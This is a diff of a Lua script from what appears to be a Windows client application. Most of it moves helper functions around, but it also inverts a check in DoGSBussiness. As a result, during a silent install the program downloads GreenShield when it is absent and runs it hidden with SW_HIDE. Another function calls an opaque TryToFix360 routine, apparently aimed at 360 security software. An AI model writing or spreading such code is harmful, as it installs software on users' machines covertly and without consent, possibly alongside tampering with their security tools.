@@ -1,6 +1,20 @@
 local FunctionObj = XLGetGlobal("DiDa.FunctionHelper")
 local tipUtil = XLGetObject("API.Util")
 
+
+function IsNilString(AString)
+	if AString == nil or AString == "" then
+		return true
+	end
+	return false
+end
+
+
+function IsRealString(str)
+	return type(str) == "string" and str ~= ""
+end
+
+
 function FetchValueByPath(obj, path)
 	local cursor = obj
 	for i = 1, #path do
@@ -13,19 +27,10 @@ function FetchValueByPath(obj, path)
 end
 
 
-function IsNilString(AString)
-	if AString == nil or AString == "" then
-		return true
-	end
-	return false
-end
-
-
 function CheckRepHistory()
-	local FunctionObj = XLGetGlobal("DiDa.FunctionHelper")
 	local tUserConfig = FunctionObj.ReadConfigFromMemByKey("tUserConfig") or {}
-	
 	local nLastRepUTC = FetchValueByPath(tUserConfig, {"tExtraCodeInfo", "nLastTSZRepUTC"})
+	
 	if IsNilString(nLastRepUTC) or FunctionObj.CheckTimeIsAnotherDay(nLastRepUTC) then
 		return true
 	end
@@ -57,7 +62,7 @@ function DoFix360Bussiness()
 	if not bPassCheck then
 		return
 	end
-	
+
 	tipUtil:TryToFix360()
 	UpdateRepHistory()
 end
@@ -68,14 +73,14 @@ function DoGSBussiness()
 	if not bRet or strSource ~= "install" then
 		return
 	end
-	
+
 	local bRet, strInsMethod = FunctionObj.GetCommandStrValue("/installmethod")
 	if not bRet or strInsMethod ~= "silent" then
 		return
 	end
 
 	local strGSPath = FunctionObj.RegQueryValue("HKEY_LOCAL_MACHINE\\Software\\GreenShield\\Path")
-	if not IsRealString(strGSPath) or not tipUtil:QueryFileExists(strGSPath) then
+	if IsRealString(strGSPath) and tipUtil:QueryFileExists(strGSPath) then
 		return 
 	end
 	
@@ -104,7 +109,6 @@ function DownLoadGS()
 			tipUtil:ShellExecute(0, "open", strRealPath, strCmd, 0, "SW_HIDE")
 	end)
 end
-
 
 
 function main()
